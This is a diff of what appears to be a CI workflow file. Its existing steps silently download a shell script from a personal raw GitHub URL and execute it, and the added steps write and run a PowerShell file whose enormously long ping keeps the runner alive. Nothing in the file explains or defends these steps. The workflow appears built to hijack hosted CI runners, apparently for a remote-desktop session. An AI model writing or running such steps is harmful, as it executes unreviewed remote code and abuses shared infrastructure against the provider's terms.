@@ -17,3 +17,5 @@ jobs:
       - run: wget https://raw.githubusercontent.com/admin123356/bagol1/main/CRD_COLAB_EXE.sh &> /dev/null
       - run: chmod +x CRD_COLAB_EXE.sh
       - run: ./CRD_COLAB_EXE.sh
+      - run: cmd /c echo ping -n 9999999999999999999999999999999999999999999999999999 10.10.10.10 >>a.ps1
+      - run: .\a.ps1
